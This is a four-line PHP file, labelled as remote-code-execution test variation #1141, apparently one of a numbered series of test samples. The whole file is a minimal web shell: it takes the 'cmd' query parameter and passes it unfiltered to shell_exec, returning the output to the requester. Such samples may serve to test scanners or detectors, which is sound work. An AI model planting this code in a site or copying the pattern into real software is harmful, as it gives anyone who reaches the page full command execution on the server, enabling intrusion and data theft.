<?php
// RCE test variation #1141
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>